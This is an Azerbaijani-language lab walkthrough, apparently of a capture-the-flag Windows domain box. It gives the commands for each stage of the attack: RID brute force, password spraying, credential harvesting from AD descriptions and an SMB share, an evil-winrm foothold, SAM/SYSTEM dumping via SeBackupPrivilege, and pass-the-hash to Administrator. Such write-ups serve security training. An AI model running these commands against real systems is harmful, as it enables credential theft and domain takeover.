📑 Hücum Mərhələləri (Kill Chain)
1. Kəşfiyyat (Enumeration)
İlkin mərhələdə heç bir şifrə olmadan Anonymous Login boşluğundan istifadə edərək Domain istifadəçilərini sızdırdıq.

Bash
# RID Brute Force ilə istifadəçi siyahısının alınması
crackmapexec smb 10.129.231.149 -u anonymous -p '' --rid-brute
2. Password Spraying & AD Enumeration
Əldə olunan istifadəçilər üzərində "Password Spraying" hücumu ilə michael.wrightson hesabına giriş qazandıq. Daha sonra Active Directory bazasındakı detallı məlumatları çəkdik:

Bash
# Bütün istifadəçi detallarını və "Description" sahələrini oxumaq
crackmapexec smb 10.129.231.149 -u 'michael.wrightson' -p '...' --users
Nəticə: david.orelious istifadəçisinin təsvir bölməsində yeni bir şifrə tapıldı.

3. SMB Data Exfiltration
David-in hesabından istifadə edərək DEV adlı paylaşılan qovluğa daxil olduq və orada bir backup skripti tapdıq.

Bash
# SMB paylaşılan qovluğa giriş
smbclient //10.129.231.149/DEV -U 'david.orelious'
Tapıntı: Backup_script.ps1 faylının içərisində emily.oscars istifadəçisinə aid hardcoded (açıq yazılmış) şifrə aşkarlandı.

4. Foothold (WinRM)
Emily-nin şifrəsi ilə sistemə WinRM üzərindən terminal girişi əldə etdik:

Bash
evil-winrm -i 10.129.231.149 -u 'emily.oscars' -p '...'
5. Privilege Escalation (SeBackupPrivilege)
İstifadəçinin səlahiyyətlərini yoxladıqda SeBackupPrivilege imtiyazının aktiv olduğunu gördük. Bu imtiyaz bizə sistem fayllarının (SAM/SYSTEM) nüsxəsini çıxarmağa imkan verir.

PowerShell
# Registry fayllarının ehtiyat nüsxəsini çıxarmaq
reg save hklm\sam sam.bak
reg save hklm\system system.bak
6. Final: Hash Dumping & Pass-The-Hash
Impacket alətləri ilə SAM faylından Administratorun NTLM hash-ini çıxardıq və şifrəni qırmadan (crack etmədən) birbaşa Admin kimi daxil olduq.

Bash
# Hash-lərin çıxarılması (Local Kali)
python3 secretsdump.py -sam sam.bak -system system.bak LOCAL

# Pass-The-Hash ilə Administrator girişi
evil-winrm -i 10.129.231.149 -u Administrator -H <NTLM_HASH>
